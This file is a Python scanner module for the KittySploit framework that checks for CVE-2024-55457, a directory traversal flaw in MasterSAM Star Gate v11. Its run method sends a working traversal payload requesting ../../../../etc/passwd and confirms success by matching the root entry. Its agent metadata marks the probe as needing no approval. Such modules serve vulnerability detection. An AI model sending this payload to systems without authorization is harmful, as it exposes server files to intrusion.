#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MasterSAM Star Gate v11 is vulnerable to a directory traversal attack via the endpoint /adama/adama/downloadSe."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MasterSAM Star Gate v11 - Local File Inclusion Detection',
        'description': 'MasterSAM Star Gate v11 is vulnerable to a directory traversal attack via the endpoint /adama/adama/downloadService. An attacker can exploit this vulnerability by manipulating the file parameter to access arbitrary files on the server, potentially leading to the exposure of sensitive information.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'lfi', 'mastersam', 'v11', 'adama', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/h13nh04ng/CVE-2024-55457-PoC',
            'https://x.com/cyber_advising/status/1876034270852231257',
        ],
        'cve': 'CVE-2024-55457',
    }

    def run(self):
        path = '/adama/adama/downloadService?type=1&file=../../../../etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_all = ('application/octet-stream', 'filename=',)
        body_regexes = ('root:.*:0:0:',)
        if (all(m in headers for m in header_all)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason='MasterSAM Star Gate v11 - Local File Inclusion detected',
                path=path,
            )
            return True
        return False

